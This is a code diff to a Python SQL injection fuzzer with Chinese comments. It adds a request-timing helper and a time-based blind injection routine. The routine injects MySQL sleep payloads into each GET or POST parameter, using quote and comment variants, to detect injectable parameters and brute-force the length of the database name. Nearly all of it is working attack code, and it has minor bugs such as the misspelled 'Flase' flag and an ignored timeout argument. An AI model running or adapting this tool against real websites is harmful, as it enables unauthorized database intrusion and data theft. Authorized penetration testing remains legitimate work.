@@ -4,6 +4,7 @@ from termcolor import cprint
 import random
 from Libs.waf import Waf
 import re
+import time
 
 class FuzzFather:
     def __init__(self):
@@ -69,6 +70,33 @@ class FuzzFather:
                 return text, len(text)
             except Exception as e:
                 return '', 0
+
+    # 返回请求的时间
+    def reqTime(self, url, headers, post_data, timeout=5):         # 请求时间
+        if post_data:   # POST
+            try:
+                start_time = time.time()
+                requests.post(url=url, data=post_data, headers=headers)
+                sleep_time = time.time() - start_time
+                if sleep_time >= timeout:
+                    return {'success': 'True', 'time': sleep_time}
+                else:
+                    return {'success': 'Flase', 'time': sleep_time}
+            except Exception as e:
+                return {'success': 'Flase', 'time': '0'}
+        else:
+            try:
+                start_time = time.time()
+                requests.get(url=url)
+                # 得返回客户端的时间  假如大于或者等于设置的时间 那就返回true
+                sleep_time = time.time() - start_time
+                if sleep_time >= timeout:
+                    return {'success': 'True', 'time': sleep_time}
+                else:
+                    return {'success': 'Flase', 'time': sleep_time}
+            except Exception as e:
+                return {'success': 'Flase', 'time': '0'}
+
 
     # 检测是否是注入
     def check(self, standard_length, payload_length1, payload_length2, payload1, payload2, text1, text2, num, func):
@@ -315,3 +343,28 @@ class FuzzFather:
                                text1=text, text2=text, num=self.num, func='error_payload')
                     self.num += 1
 
+    def blind_payload(self, url, params, headers, standard_length, type):
+        cprint('检测时间型盲注：↓', 'red')
+        paramsList = params.split('&')
+        for i in range(len(paramsList)):
+            for each in ['', '"', "'"]:
+                note = random.choice(['--+', '%23'])
+                j = 1
+                while j < 15:
+                    payload_param = paramsList[i] + "{} and sleep( if( (select length(database()) = {}) , 5, 0 ) ){}".format(each,j,note)  # 长度payload
+                    if type == 'get':  # GET
+                        payload = url.replace(paramsList[i], payload_param)  # 构造好的参数payload替换掉原先的参数
+                        blind_flag = self.reqTime(url=payload, headers=headers, post_data=None)
+                    else:  # POST
+                        payload = params.replace(paramsList[i], payload_param)  # 构造好的参数payload替换掉原先的参数
+                        blind_flag = self.reqTime(url=url, headers=headers, post_data=payload)
+                    print('[{}] 测试 ：{} [{}]'.format(j, payload, blind_flag['time']))
+                    if blind_flag['success'] == 'True':
+                        cprint('[+]延时注入！ database() 的长度为： {}'.format(j), 'red')
+                        self.ret['success'] = 'True'
+                        self.ret['type'] = '盲注'
+                        self.ret['payload'] = payload
+                        self.ret['waf'] = 'None'
+                        self.Payloads.append(self.ret)
+                        break
+                    j = j + 1
